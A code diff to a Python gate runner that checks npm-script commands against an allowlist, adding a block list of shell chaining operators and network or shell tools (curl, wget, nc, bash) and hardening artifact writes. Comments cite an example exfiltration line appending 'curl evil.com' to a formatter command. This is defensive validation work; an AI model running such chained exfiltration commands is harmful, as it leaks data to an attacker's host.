@@ -157,6 +157,40 @@ _FORBIDDEN_SCRIPT_FRAGMENTS: Tuple[str, ...] = (
 )
 
 
+# Shell metacharacters and compound-command operators. npm/yarn/pnpm
+# scripts run through ``<runner> run <name>`` which invokes a shell on
+# the script body, so ANY metacharacter that lets a script chain or
+# substitute commands turns the allowlist into a foothold:
+# ``"format:check": "prettier --check && curl evil.com"`` would pass
+# the head check and then execute the appended exfiltration. Reject
+# the whole script when any of these tokens appear. List spans the
+# minimum metachar set codex review iteration 1 Finding 1 requested
+# plus the obvious shell-out binaries.
+_SHELL_METACHAR_TOKENS: Tuple[str, ...] = (
+    "&&",
+    "||",
+    ";",
+    "|",
+    "&",
+    "`",
+    "$(",
+    "${",
+    ">",
+    ">>",
+    "<",
+    "<<",
+    "\n",
+    "\r",
+    " curl ",
+    " wget ",
+    " nc ",
+    " bash ",
+    " sh ",
+    " eval ",
+    "node -e",
+)
+
+
 # Heads (after stripping the package manager prefix like ``npm run``) that
 # we accept as gate-style commands.
 _ACCEPTABLE_SCRIPT_HEADS: Tuple[str, ...] = (
@@ -184,13 +218,41 @@ def _detect_node_runner(worktree: Path) -> str:
 
 
 def _script_is_acceptable(command: str) -> bool:
-    """Return True when an npm-script command-string is allowlisted."""
+    """Return True when an npm-script command-string is allowlisted.
+
+    The npm-run path delegates to ``<runner> run <name>`` which spawns a
+    shell for the script body. Anything beyond a single recognised tool
+    head and its arguments must be rejected:
+    * ``_FORBIDDEN_SCRIPT_FRAGMENTS`` blocks mutation/install/deploy
+      semantics even when wrapped in an allowlisted head.
+    * ``_SHELL_METACHAR_TOKENS`` blocks command chaining and substitution
+      so a script body like ``prettier --check && curl evil.com`` cannot
+      slip through the head check.
+
+    The metachar check is performed against the ORIGINAL (case-preserved)
+    command for substrings that are case-sensitive (e.g. ``$(``), and
+    against the lower-cased form for word-style fragments (e.g.
+    ``" curl "``). Both modes are inclusive: any match rejects the
+    script.
+    """
     if not command:
         return False
     lowered = command.lower()
     for forbidden in _FORBIDDEN_SCRIPT_FRAGMENTS:
         if forbidden in lowered:
             return False
+    # Case-sensitive shell metachar / substitution / redirection /
+    # newline / lead-with-shell-binary tokens. Tokens carrying a space
+    # are matched space-padded to avoid clobbering legitimate paths like
+    # ``./sh-test/`` while still catching `` bash `` / `` sh `` / `` nc ``.
+    padded = " " + lowered + " "
+    for token in _SHELL_METACHAR_TOKENS:
+        if token.startswith(" ") and token.endswith(" "):
+            if token in padded:
+                return False
+        else:
+            if token in command or token in lowered:
+                return False
     # Strip leading package-manager prefix so that
     # ``npm run format:check`` and ``yarn format:check`` both reduce to
     # the recognised tool head.
@@ -584,22 +646,90 @@ def run_gates(
     ``exit_code=None`` and a non-empty ``error``; the caller is expected
     to treat that as a gate failure via ``gate_results_to_findings``.
     """
-    artifacts_dir.mkdir(parents=True, exist_ok=True)
+    try:
+        artifacts_dir.mkdir(parents=True, exist_ok=True)
+    except OSError as exc:
+        logger.warning(
+            "checkup-gates: artifacts dir %s unwritable (%s); "
+            "running gates without persistence.",
+            artifacts_dir,
+            exc,
+        )
     results: List[GateResult] = []
     for gate in gates:
+        # Execute the gate first; ``_execute_one`` is already
+        # exception-safe and returns a ``GateResult`` even on
+        # runner-side failure. Persistence is best-effort: if writing
+        # the per-gate artifact raises (disk full, read-only fs), we
+        # OVERWRITE this gate's result with a runner-error entry so
+        # the audit trail records the persistence failure on that
+        # specific gate AND the loop sees a failing finding rather
+        # than mistaking the gate for "passed". The other gates
+        # continue executing.
         result = _execute_one(worktree, gate, default_timeout=default_timeout)
-        results.append(result)
         per_gate_path = (
             artifacts_dir
             / f"round-{round_number}-{mode}-gate-{_safe_slug(gate.name)}.txt"
         )
-        body = _render_per_gate_body(result)
-        per_gate_path.write_text(body, encoding="utf-8")
+        try:
+            per_gate_path.write_text(_render_per_gate_body(result), encoding="utf-8")
+        except Exception as exc:  # noqa: BLE001 - defensive: never raise
+            logger.warning(
+                "checkup-gates: failed to persist artifact for gate %r: %s",
+                gate.name,
+                exc,
+                exc_info=True,
+            )
+            # If the gate itself passed, downgrade to a runner-error
+            # row so the loop's findings adapter still surfaces the
+            # broken persistence. If the gate already failed, keep
+            # its original exit code and append the persistence error
+            # to ``error`` so the existing failure ride-along stays
+            # intact while the operator still sees the artifact gap.
+            persistence_error = f"{type(exc).__name__}: {exc}"
+            if result.exit_code == 0:
+                result = GateResult(
+                    gate=result.gate,
+                    exit_code=None,
+                    stdout_excerpt=result.stdout_excerpt,
+                    stderr_excerpt=result.stderr_excerpt,
+                    duration_seconds=result.duration_seconds,
+                    started_at_iso=result.started_at_iso,
+                    error=persistence_error,
+                )
+            else:
+                combined_error = (
+                    f"{result.error}; persistence: {persistence_error}"
+                    if result.error
+                    else persistence_error
+                )
+                result = GateResult(
+                    gate=result.gate,
+                    exit_code=result.exit_code,
+                    stdout_excerpt=result.stdout_excerpt,
+                    stderr_excerpt=result.stderr_excerpt,
+                    duration_seconds=result.duration_seconds,
+                    started_at_iso=result.started_at_iso,
+                    error=combined_error,
+                )
+        results.append(result)
     manifest = artifacts_dir / f"round-{round_number}-{mode}-gates.json"
-    manifest.write_text(
-        json.dumps([result.to_dict() for result in results], indent=2),
-        encoding="utf-8",
-    )
+    try:
+        manifest.write_text(
+            json.dumps([result.to_dict() for result in results], indent=2),
+            encoding="utf-8",
+        )
+    except Exception as exc:  # noqa: BLE001 - defensive: never raise
+        # The aggregate manifest is best-effort. Per-gate text artifacts
+        # (and the in-memory results returned to the caller) are the
+        # ship-gate; losing the JSON manifest only hurts later offline
+        # audit, so log and continue rather than failing the loop.
+        logger.warning(
+            "checkup-gates: failed to persist manifest %s: %s",
+            manifest,
+            exc,
+            exc_info=True,
+        )
     return results
 
 
